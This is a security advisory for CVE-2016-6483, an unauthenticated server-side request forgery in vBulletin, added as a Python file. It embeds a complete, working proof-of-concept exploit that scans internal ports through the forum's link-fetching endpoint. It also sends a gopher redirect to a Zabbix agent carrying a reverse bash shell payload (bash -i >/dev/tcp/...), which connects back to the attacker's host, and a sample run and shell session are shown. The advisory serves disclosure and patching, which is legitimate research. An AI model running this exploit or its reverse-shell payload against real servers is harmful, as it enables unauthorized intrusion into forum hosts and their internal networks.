@@ -1,0 +1,524 @@
+'''
+=============================================
+- Discovered by: Dawid Golunski
+- http://legalhackers.com
+- dawid (at) legalhackers.com
+
+- CVE-2016-6483 
+- Release date: 05.08.2016
+- Severity: High
+=============================================
+
+
+I. VULNERABILITY
+-------------------------
+
+vBulletin  <= 5.2.2      Preauth Server Side Request Forgery (SSRF) 
+vBulletin  <= 4.2.3
+vBulletin  <= 3.8.9
+
+
+II. BACKGROUND
+-------------------------
+
+vBulletin (vB) is a proprietary Internet forum software package developed by 
+vBulletin Solutions, Inc., a division of Internet Brands. 
+
+https://www.vbulletin.com/
+https://en.wikipedia.org/wiki/VBulletin
+
+
+A google search for "Powered by vBulletin" returns over 19 million sites
+that are hosting a vBulletin forum:
+
+https://www.google.co.uk/?gws_rd=ssl#q=%22Powered+by+vBulletin%22
+
+
+III. INTRODUCTION
+-------------------------
+
+vBulletin forum software is affected by a SSRF vulnerability that allows 
+unauthenticated remote attackers to access internal services (such as mail 
+servers, memcached, couchDB, zabbix etc.) running on the server hosting 
+vBulletin as well as services on other servers on the local network that are 
+accessible from the target.
+
+This advisory provides a PoC exploit that demonstrates how an unauthenticated
+attacker could perform a port scan of the internal services as well as execute
+arbitrary system commands on a target vBulletin host with a locally installed 
+Zabbix Agent monitoring service.
+
+IV. DESCRIPTION
+-------------------------
+
+vBulletin allows forum users to share media fiels by uploading them to the 
+remote server. Some pages allow users to specify a URL to a media file
+that a user wants to share which will then be retrieved by vBulletin. 
+The user-provided links are validated to make sure that users can only access
+resources from HTTP/HTTPS protocols and that connections are not allowed in to 
+the localhost.
+
+These restrictions can be found in core/vb/vurl/curl.php source file:
+
+/**
+ *      Determine if the url is safe to load
+ *
+ *      @param $urlinfo -- The parsed url info from vB_String::parseUrl -- scheme, port, host
+ *      @return boolean
+ */
+private function validateUrl($urlinfo)
+{
+	// VBV-11823, only allow http/https schemes
+	if (!isset($urlinfo['scheme']) OR !in_array(strtolower($urlinfo['scheme']), array('http', 'https')))
+	{
+		return false;
+	}
+
+	// VBV-11823, do not allow localhost and 127.0.0.0/8 range by default
+	if (!isset($urlinfo['host']) OR preg_match('#localhost|127\.(\d)+\.(\d)+\.(\d)+#i', $urlinfo['host']))
+	{
+		return false;
+	}
+
+	if (empty($urlinfo['port']))
+	{
+		if ($urlinfo['scheme'] == 'https')
+		{
+			$urlinfo['port'] = 443;
+		}
+		else
+		{
+			$urlinfo['port'] = 80;
+		}
+	}
+       // VBV-11823, restrict detination ports to 80 and 443 by default
+	// allow the admin to override the allowed ports in config.php (in case they have a proxy server they need to go to).
+	$config = vB::getConfig();
+[...]
+
+
+HTTP redirects are also prohibited however there is one place in the vBulletin
+codebase that accepts redirects from the target server specified in a 
+user-provided link.
+The code is used to upload media files within a logged-in user's profile and 
+can normally be accessed under a path similar to:
+
+http://forum/vBulletin522/member/1-mike/media
+
+By specifying a link to a malicious server that returns a 301 HTTP redirect to 
+the URL of http://localhost:3306 for example, an attacker could easily 
+bypass the restrictions presented above and make a connection to mysql/3306 
+service listening on the localhost.
+
+This introduces a Server Side Request Forgery (SSRF) vulnerability.
+
+As curl is used to fetch remote resources, in addition to HTTP, attackers could 
+specify a handful of other protocols to interact with local services. 
+For instance, by sending a redirect to  gopher://localhost:11211/datahere
+attackers could send arbitrary traffic to memcached service on 11211 port.
+
+Additionally, depending on the temporary directory location configured within
+the forum, attackers could potentially view the service responses as the 
+download function stores responses within temporary files which could be 
+viewed if the temporary directory is exposed on the web server.
+
+
+V. PROOF OF CONCEPT EXPLOIT
+-------------------------
+
+The exploit code below performs a port scan as well as demonstrates remote 
+command execution via a popular Zabbix Agent monitoring service which might be
+listening on local port of 10050.
+The exploit will execute a reverse bash shell on the target if it has the agent 
+installed and permits remote commands.
+
+The exploit was verified on the following zabbix agent configuration 
+(/etc/zabbix/zabbix_agentd.conf):
+
+Server=127.0.0.1,::1
+EnableRemoteCommands=1
+
+
+------------[ vBulletin_SSRF_exploit.py ]-----------
+'''
+
+#!/usr/bin/python
+
+intro = """
+vBulletin <= 5.2.2 SSRF PoC Exploit (portscan / zabbix agent RCE)
+
+This PoC exploits an SSRF vulnerability in vBulletin to scan internal services
+installed on the web server that is hosting the vBulletin forum.
+
+After the scan, the exploit also checks for a Zabbix Agent (10050) port and
+gives an option to execute a reverse shell (Remote Commands) that will connect
+back to the attacker's host on port 8080 by default. 
+
+Coded by:
+
+ Dawid Golunski
+ http://legalhackers.com
+"""
+usage = """
+Usage:
+The exploit requires that you have an external IP and can start a listener on port 80/443
+on the attacking machine.
+
+./vBulletin_SSRF_exploit.py our_external_IP vBulletin_base_url [minimum_port] [maximum_port]
+
+Example invocation that starts listener on 192.168.1.40 (port 80) and scans local ports 1-85
+on the remote vBulletin target host:
+
+./vBulletin_SSRF_exploit.py 192.168.1.40 http://vbulletin-target/forum 1 85
+
+Before exploiting Zabbix Agent, start your netcat listener on 8080 port in a separate shell e.g:
+
+nc -vv -l -p 8080
+
+Disclaimer:
+For testing purposes only. Do no harm.
+
+SSL/TLS support needs some tuning. For better results, provide HTTP URL to the vBulletin target.
+"""
+
+import web # http://webpy.org/installation
+import threading
+import time
+import urllib
+import urllib2
+import socket
+import ssl
+import sys
+
+
+# The listener that will send redirects to the targe
+class RedirectServer(threading.Thread):
+    def run (self):
+        urls = ('/([0-9a-z_]+)', 'do_local_redir')
+        app = web.application(urls, globals())
+        #app.run()
+	return web.httpserver.runsimple( app.wsgifunc(), ('0.0.0.0', our_port))
+
+class do_local_redir:
+    def GET(self,whereto):
+	if whereto == "zabbixcmd_redir":
+		# code exec
+		# redirect to gopher://localhost:10050/1system.run[(/bin/bash -c 'nohup bash -i >/dev/tcp/our_ip/shell_port 0<&1 2>&1 &')  ; sleep 2s]
+		return web.HTTPError('301', {'Location': 'gopher://localhost:10050/1system.run%5b(%2Fbin%2Fbash%20-c%20%27nohup%20bash%20-i%20%3E%2Fdev%2Ftcp%2F'+our_ext_ip+'%2F'+str(shell_port)+'%200%3C%261%202%3E%261%20%26%27) %20%3B%20sleep%202s%5d' } )
+	else:
+		# internal port connection
+		return web.HTTPError('301', {'Location': "telnet://localhost:%s/" % whereto} )
+
+def shutdown(code):
+	print "\nJob done. Exiting"
+	if redirector_started == 1:
+		web.httpserver.server.interrupt = KeyboardInterrupt()
+	exit(code)
+
+
+# [ Default settings ]
+
+# reverse shell will connect back to port defined below
+shell_port = 8080
+# Our HTTP redirector/server port (must be 80 or 443 for vBulletin to accept it)
+our_port = 443
+# How long to wait (seconds) before considering a port to be opened. 
+# Don't set it too high to avoid service timeout and an incorrect close state
+connect_time = 2
+# Default port scan range is limited to 20-90 to speed up things when testing,
+# feel free to increase maxport to 65535 here or on the command line if you've
+# got the time ;)
+minport = 20
+maxport = 90
+# ignore invalid certs (enable if target forum is HTTPS)
+#ssl_context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+
+
+# [ Main Meat ]
+
+print intro
+redirector_started = 0
+
+if len(sys.argv) < 3 :
+   print usage
+   sys.exit(2)
+
+# Set our HTTP Listener/Redirector's external IP
+our_ext_ip = sys.argv[1]
+try:
+    socket.inet_aton(our_ext_ip)
+except socket.error:
+    print "Invalid HTTP redirector server IP [%s]!\n" % our_ext_ip
+    exit(2)
+
+our_server = "http://%s:%s" % (our_ext_ip, our_port)
+
+# Target forum base URL (e.g. http://vulnerable-vbulletin/forum)
+targetforum = sys.argv[2]
+# Append vulnerable media upload script path to the base URL
+targeturl =  targetforum.strip('/') + "/link/getlinkdata"
+
+# Change port range (if provided)
+if (len(sys.argv) == 5) :
+	minport = int(sys.argv[3])
+# Finish scanning at maxport
+	maxport = int(sys.argv[4])
+
+
+# Confirm data
+print "\n* Confirm your settings\n"
+print "Redirect server to listen on: %s:%s\nTarget vBulletin URL: %s\nScan ports between: %d - %d\n" % (our_ext_ip, our_port, targeturl, minport, maxport)
+key = raw_input("Are these settings correct? Hit enter to start the port scan... ")
+
+# Connection check
+print "\n* Testing connection to vulnerable script at [%s]\n" % targeturl
+req = urllib2.Request(targeturl, data=' ', headers={ 'User-Agent': 'Mozilla/5.0' } )
+try:
+	response = urllib2.urlopen(req, timeout=connect_time).read()
+except urllib2.URLError as e:
+        print "Invalid forum URI / HTTP request failed (reason: %s)\n" % e.reason
+	shutdown(2)
+
+# Server should return 'invalid_url' string if not url provided in POST
+if "invalid_url" not in response:
+	print """Invalid target url (%s) or restricted access.\n
+              \nTest with:\n curl -X POST -v %s\nShutting down\n""" % (targeturl, targeturl)
+	sys.exit(2)
+else:
+	print "Got the right response from the URL. The target looks vulnerable!\n" 
+
+# [ Start the listener and perform a port scan ]
+print "Let's begin!\n"
+print "* Starting our redirect base server on %s:%s \n" % (our_ext_ip, our_port)
+RedirectServer().start()
+redirector_started = 1
+
+print "* Scanning local ports from %d to %d on [%s] target \n" % (minport, maxport, targetforum)
+start = time.time()
+opened_ports = []
+maxport+=1
+
+for targetport in range(minport, maxport):
+        #print "\n\nScanning port %d\n" % (targetport)
+	fetchurl =  '%s/%d' % (our_server, targetport)
+	data = urllib.urlencode({'url' : fetchurl})
+	req = urllib2.Request(targeturl, data=data, headers={ 'User-Agent': 'Mozilla/5.0' } )
+	try:
+	    response = urllib2.urlopen(req,  timeout=connect_time)
+	except urllib2.URLError, e:
+	    print "Oops, url issue? 403 , 404 etc.\n"
+	except socket.timeout, ssl.SSLError:
+	    print "Conection opened for %d seconds. Port %d is opened!\n" % (connect_time, targetport)
+	    opened_ports.append(targetport)
+
+elapsed = (time.time() - start)
+print "\nScanning done in %d seconds. \n\n* Opened ports on the target [%s]: \n" % (elapsed, targetforum)
+for listening in opened_ports:
+	print "Port %d : Opened\n" % listening
+print "\nAnything juicy? :)\n"
+
+if 10050 in opened_ports:
+	print "* Zabbix Agent was found on port 10050 !\n"
+
+# [ Command execution via Zabbix Agent to gain a reverse shell ]
+key = raw_input("Want to execute a reverse shell via the Zabbix Agent? (start netcat before you continue) [y/n] ")
+if key != 'y' :
+	shutdown(0)
+
+print "\n* Executing reverse shell via Zabbix Agent (10050)."
+fetchurl =  '%s/%s' % (our_server, 'zabbixcmd_redir')
+data = urllib.urlencode({'url' : fetchurl})
+req = urllib2.Request(targeturl, data=data, headers={ 'User-Agent': 'Mozilla/5.0' } )
+payload_executed = 0
+try:
+    response = urllib2.urlopen(req,  timeout=connect_time)
+except urllib2.URLError, e:
+    print "Oops, url issue? 403 , 404 etc.\n"
+except socket.timeout, ssl.SSLError:
+    # Agent connection remained opened for 2 seconds after the bash payload was sent, 
+    # it looks like the sleep 2s shell command must have got executed sucessfuly
+    payload_executed = 1
+
+if (payload_executed == 1) :
+        print "\nLooks like Zabbix Agent executed our bash payload! Check your netcat listening on port %d for shell! :)\n" % shell_port
+else:
+        print "\nNo luck. No Zabbix Agent listening on 10050 port or remote commands are disabled :(\n"
+
+shutdown(0)
+
+'''
+----------------------[ eof ]------------------------
+
+
+Example run:
+
+root@trusty:~/vbexploit# ./vBulletin_SSRF_exploit.py 192.168.57.10 http://192.168.57.10/vBulletin522new/ 20 85
+
+vBulletin <= 5.2.2 SSRF PoC Exploit (Localhost Portscan / Zabbix Agent RCE)
+
+This PoC exploits an SSRF vulnerability in vBulletin to scan internal services
+installed on the web server that is hosting the vBulletin forum.
+
+After the scan, the exploit also checks for a Zabbix Agent (10050) port and
+gives an option to execute a reverse shell (Remote Commands) that will connect
+back to the attacker's host on port 8080 by default. 
+
+Coded by:
+
+ Dawid Golunski
+ http://legalhackers.com
+
+
+* Confirm your settings
+
+Redirect server to listen on: 192.168.57.10:443
+Target vBulletin URL: http://192.168.57.10/vBulletin522new/link/getlinkdata
+Scan ports between: 20 - 85
+
+Are these settings correct? Hit enter to start the port scan... 
+
+* Testing connection to vulnerable script at [http://192.168.57.10/vBulletin522new/link/getlinkdata]
+
+Got the right response from the URL. The target looks vulnerable!
+
+Let's begin!
+
+* Starting our redirect base server on 192.168.57.10:443 
+
+* Scanning local ports from 20 to 85 on [http://192.168.57.10/vBulletin522new/] target 
+
+http://0.0.0.0:443/
+192.168.57.10:58675 - - [30/Jul/2016 03:00:25] "HTTP/1.1 GET /20" - 301
+192.168.57.10:58679 - - [30/Jul/2016 03:00:25] "HTTP/1.1 GET /21" - 301
+192.168.57.10:58683 - - [30/Jul/2016 03:00:25] "HTTP/1.1 GET /22" - 301
+Conection opened for 2 seconds. Port 22 is opened!
+
+192.168.57.10:58686 - - [30/Jul/2016 03:00:27] "HTTP/1.1 GET /23" - 301
+192.168.57.10:58690 - - [30/Jul/2016 03:00:27] "HTTP/1.1 GET /24" - 301
+192.168.57.10:58694 - - [30/Jul/2016 03:00:28] "HTTP/1.1 GET /25" - 301
+Conection opened for 2 seconds. Port 25 is opened!
+
+192.168.57.10:58697 - - [30/Jul/2016 03:00:30] "HTTP/1.1 GET /26" - 301
+[...]
+192.168.57.10:58909 - - [30/Jul/2016 03:00:36] "HTTP/1.1 GET /79" - 301
+192.168.57.10:58913 - - [30/Jul/2016 03:00:36] "HTTP/1.1 GET /80" - 301
+Conection opened for 2 seconds. Port 80 is opened!
+
+192.168.57.10:58917 - - [30/Jul/2016 03:00:38] "HTTP/1.1 GET /81" - 301
+192.168.57.10:58921 - - [30/Jul/2016 03:00:38] "HTTP/1.1 GET /82" - 301
+192.168.57.10:58925 - - [30/Jul/2016 03:00:39] "HTTP/1.1 GET /83" - 301
+192.168.57.10:58929 - - [30/Jul/2016 03:00:39] "HTTP/1.1 GET /84" - 301
+192.168.57.10:58933 - - [30/Jul/2016 03:00:39] "HTTP/1.1 GET /85" - 301
+
+Scanning done in 14 seconds. 
+
+* Opened ports on the target [http://192.168.57.10/vBulletin522new/]: 
+
+Port 22 : Opened
+
+Port 25 : Opened
+
+Port 80 : Opened
+
+
+Anything juicy? :)
+
+Want to execute a reverse shell via the Zabbix Agent? (start netcat before you continue) [y/n] y
+
+* Executing reverse shell via Zabbix Agent (10050).
+192.168.57.10:58940 - - [30/Jul/2016 03:00:45] "HTTP/1.1 GET /zabbixcmd_redir" - 301
+
+Looks like Zabbix Agent executed our bash payload! Check your netcat listening on port 8080 for shell! :)
+
+
+Job done. Exiting
+
+
+Here is how the netcat session looks like after a sucessful exploitation:
+
+$ nc -vvv -l -p 8080
+Listening on [0.0.0.0] (family 0, port 8080)
+Connection from [192.168.57.10] port 8080 [tcp/*] accepted (family 2, sport 54259)
+
+zabbix@trusty:/$ id
+id
+uid=122(zabbix) gid=129(zabbix) groups=129(zabbix)
+zabbix@trusty:/$ 
+
+
+
+As we can see reverse shell was executed on the target which sucessfully
+connected back to the attacker's netcat listener.
+
+VI. BUSINESS IMPACT
+-------------------------
+
+The vulnerability can expose internal services running on the server/within 
+the local network. 
+If not patched, unauthenticated attackers or automated scanners searching for
+vulnerable servers could send malicious data to internal services.
+Depending on services in use, the impact could range from sensitive information
+disclosure, sending spam, DoS/data loss to code execution as demonstrated by 
+the PoC exploit in this advisory.
+
+ 
+VII. SYSTEMS AFFECTED
+-------------------------
+
+All vBulletin forums in all branches (5.x, 4.x , 3.x) without the latest patches
+named in the next section are affected by this vulnerability. 
+
+ 
+VIII. SOLUTION
+-------------------------
+
+Upon this advisory, vendor has published the following security releases of
+vBulletin for each of the affected branches:
+
+
+ vBulletin 5.2.3
+
+ vBulletin 4.2.4 Beta
+
+ vBulletin 3.8.10 Beta
+
+
+Separate patches have also been released (see references below).
+ 
+IX. REFERENCES
+-------------------------
+
+http://legalhackers.com
+
+http://legalhackers.com/advisories/vBulletin-SSRF-Vulnerability-Exploit.txt
+
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6483 
+
+vBulletin patches:
+
+http://www.vbulletin.com/forum/forum/vbulletin-announcements/vbulletin-announcements_aa/4349551-security-patch-vbulletin-5-2-0-5-2-1-5-2-2
+
+http://www.vbulletin.com/forum/forum/vbulletin-announcements/vbulletin-announcements_aa/4349549-security-patch-vbulletin-4-2-2-4-2-3-4-2-4-beta
+
+http://www.vbulletin.com/forum/forum/vbulletin-announcements/vbulletin-announcements_aa/4349548-security-patch-vbulletin-3-8-7-3-8-8-3-8-9-3-8-10-beta
+
+X. CREDITS
+-------------------------
+
+The vulnerability has been discovered by Dawid Golunski
+
+dawid (at) legalhackers (dot) com
+http://legalhackers.com
+ 
+XI. REVISION HISTORY
+-------------------------
+
+05.08.2016 - final advisory released
+ 
+XII. LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this information.
+'''
